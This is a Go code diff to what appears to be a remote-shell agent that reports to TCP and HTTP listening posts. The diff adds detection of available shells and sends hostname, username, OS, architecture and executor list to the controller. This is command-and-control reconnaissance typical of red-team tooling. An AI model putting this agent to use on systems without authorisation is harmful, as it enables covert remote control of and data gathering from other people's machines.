@@ -1,7 +1,9 @@
 package main
 
 import (
+   "bytes"
    "bufio"
+   "os/exec"
    "fmt"
    "net"
    "strings"
@@ -15,6 +17,39 @@ import (
 )
 
 var shellInfo, httpServer, paw string
+
+func determineExecutor(platform string, arch string) string {
+	platformExecutors := map[string]map[string][]string {
+		"windows": {
+			"file": {"cmd.exe", "powershell.exe", "pwsh.exe"},
+			"executor": {"cmd", "psh", "pwsh"},
+		},
+		"linux": {
+			"file": {"sh", "pwsh"},
+			"executor": {"sh", "pwsh"},
+		},
+		"darwin": {
+			"file": {"sh", "pwsh"},
+			"executor": {"sh", "pwsh"},
+		},
+   }
+   var executors bytes.Buffer
+   for platformKey, platformValue := range platformExecutors {
+      if platform == platformKey {
+         for i := range platformValue["file"] {
+            if checkIfExecutorAvailable(platformValue["file"][i]) {
+               executors.WriteString(platformExecutors[platformKey]["executor"][i] + ",")
+            }
+         }
+      }
+   }
+	return executors.String()
+}
+
+func checkIfExecutorAvailable(executor string) bool {
+	_, err := exec.LookPath(executor)
+	return err == nil
+}
 
 func runNextCommand(message string) []byte {
    if strings.HasPrefix(message, "cd") {
@@ -60,7 +95,9 @@ func main() {
    host, _ := os.Hostname()
    user, _ := user.Current()
    platform := runtime.GOOS
-   shellInfo = fmt.Sprintf("%s$%s$%s", host, user.Username, platform)
+   architecture := runtime.GOARCH
+   executors := determineExecutor(platform, architecture)
+   shellInfo = fmt.Sprintf("%s$%s$%s$%s$%s", host, user.Username, platform, architecture, executors)
 
    tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
    http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
